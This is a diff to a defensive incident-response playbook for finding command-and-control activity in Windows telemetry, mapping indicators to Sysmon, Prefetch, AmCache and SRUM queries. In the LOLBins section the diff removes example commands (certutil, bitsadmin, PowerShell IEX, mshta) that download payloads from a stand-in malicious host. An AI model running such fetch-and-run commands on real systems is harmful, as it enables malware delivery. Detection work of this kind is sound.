@@ -10,39 +10,37 @@ playbook: |
   
   ### Key Indicators to Investigate:
   
-  1. **Network Beaconing (Sysmon 3)**
-     - Periodic connections to external IPs (C2 check-ins)
+  1. **Network Beaconing**
+     - **Network Connection** (event_type='evtx_sysmon_3'): Periodic connections to external IPs (C2 check-ins)
      - Fields: event_data.DestinationIp, event_data.DestinationPort, event_data.Image
-     - Query: Aggregate Sysmon 3 by DestinationIp and timestamp intervals
+     - Query: Aggregate by DestinationIp and timestamp intervals
      - Patterns to detect:
        - Regular intervals (every 60s, 5min, 15min)
        - Same destination IP, consistent port
        - Small payload sizes (heartbeat traffic)
      - Red flags: Non-browser processes with regular external connections
   
-  2. **Unusual Network Connections (Sysmon 3)**
-     - Unexpected processes making network connections
+  2. **Unusual Network Connections**
+     - **Network Connection** (event_type='evtx_sysmon_3'): Unexpected processes making network connections
      - Fields: event_data.Image, event_data.DestinationIp, event_data.DestinationPort
-     - Query: event_type='evtx_sysmon_3'
      - Suspicious source processes:
-       - powershell.exe, cmd.exe, rundll32.exe
-       - Office applications (Word, Excel)
-       - System utilities (certutil.exe, regsvr32.exe)
+       - Scripting engines and command interpreters
+       - Office applications
+       - System utilities
      - Common C2 ports: 443 (HTTPS), 80 (HTTP), 8080, 53 (DNS), 22 (SSH)
   
-  3. **DNS Tunneling (Sysmon 22, DNS logs)**
-     - Sysmon 22: DNS query events
+  3. **DNS Tunneling**
+     - **DNS Query** (event_type='evtx_sysmon_22'): DNS query events
      - Fields: event_data.QueryName, event_data.QueryResults
-     - Query: event_type='evtx_sysmon_22'
      - Indicators:
-       - Long subdomain names (>50 chars)
+       - Long subdomain names
        - High entropy domain names (random strings)
        - Frequent queries to same domain
-       - Unusual TXT, NULL, or CNAME queries
-     - Red flags: Base64-encoded subdomains, excessive query volume
+       - Unusual query types
+     - Red flags: Encoded subdomains, excessive query volume
   
-  4. **Web-Based C2 (Sysmon 3, Proxy logs)**
-     - HTTP/HTTPS connections to malicious domains
+  4. **Web-Based C2**
+     - **Network Connection** (event_type='evtx_sysmon_3'): HTTP/HTTPS connections
      - User-Agent anomalies (custom, outdated, or missing)
      - Query: Check DestinationIp reputation, domain age
      - Patterns:
@@ -51,10 +49,17 @@ playbook: |
        - Unusual HTTP headers
      - Red flags: Connections to newly registered domains, suspicious TLDs
   
-  5. **Remote Access Tools (Event ID 4688, Sysmon 1, 3)**
-     - Legitimate tools abused for C2
-     - Tools: TeamViewer, AnyDesk, LogMeIn, VNC, RDP
-     - Query: `search_events_by_content` for remote access tools
+  5. **Remote Access Tools Detection**
+     - **PRIORITY**: Use execution artifacts to detect remote access tools:
+       - **Prefetch** (event_type='prefetch_execution'): Search for 'teamviewer', 'anydesk', 'vnc', 'logmein'
+       - **AmCache** (event_type='registry_amcache'): Get installation times and hashes
+       - **ShimCache** (event_type='registry_shimcache'): Detect presence of remote tools
+       - **SRUM** (event_type='srum_data'): Network usage by remote access tools
+     - **Process Creation** (event_type='evtx_sysmon_1' or 'evtx_security_4688'):
+       - Fields: event_data.Image, event_data.CommandLine
+     - **Network Connection** (event_type='evtx_sysmon_3'):
+       - Fields: event_data.Image, event_data.DestinationIp
+       - Query: `search_events_by_content` for remote access tool patterns
      - Red flags: 
        - Unexpected installations
        - Connections to unusual IPs
@@ -62,11 +67,7 @@ playbook: |
   
   6. **Living-off-the-Land Binaries (LOLBins)**
      - Abusing built-in Windows tools for C2
-     - Tools to watch:
-       - `certutil.exe -urlcache -f http://malicious.com/payload.exe`
-       - `bitsadmin.exe /transfer job http://malicious.com/file.exe`
-       - `powershell.exe -c IEX(New-Object Net.WebClient).DownloadString()`
-       - `mshta.exe http://malicious.com/payload.hta`
+     - Look for built-in tools with network activity patterns
      - Query: `search_events_by_content` for LOLBin network usage
      - Red flags: LOLBins with network activity
   
@@ -89,24 +90,23 @@ playbook: |
      - Red flags: Large ICMP packets, SSH from unexpected processes
   
   9. **Cloud-Based C2**
-     - Using cloud services for C2 (Dropbox, OneDrive, Pastebin)
+     - Using cloud services for C2
      - Query: Check for connections to cloud APIs
      - Patterns:
        - Unusual processes accessing cloud storage
        - Automated uploads/downloads
        - API calls from scripts
-     - Red flags: Cloud sync from PowerShell, cmd.exe
+     - Red flags: Cloud sync from scripting engines
   
   10. **Proxy/VPN Usage**
      - Hiding C2 traffic through proxies/VPNs
-     - Tools: Tor, commercial VPNs, SOCKS proxies
      - Query: Look for proxy client installations
-     - Red flags: Unexpected VPN clients, Tor usage
+     - Red flags: Unexpected VPN clients, anonymization tools
   
   ### Investigation Strategy:
   
   **Phase 1 - Identify C2 Activity**
-  - Query Sysmon 3 for external network connections
+  - Query event_type='evtx_sysmon_3' for external network connections
   - Aggregate by DestinationIp to find repeated connections
   - Look for beaconing patterns (regular intervals)
   
@@ -138,7 +138,7 @@ playbook: |
   
   ### Beaconing Detection:
   
-  To detect beaconing, aggregate Sysmon 3 events:
+  To detect beaconing, aggregate network connection events (event_type='evtx_sysmon_3'):
   
   ```
   1. Group by: DestinationIp, Image
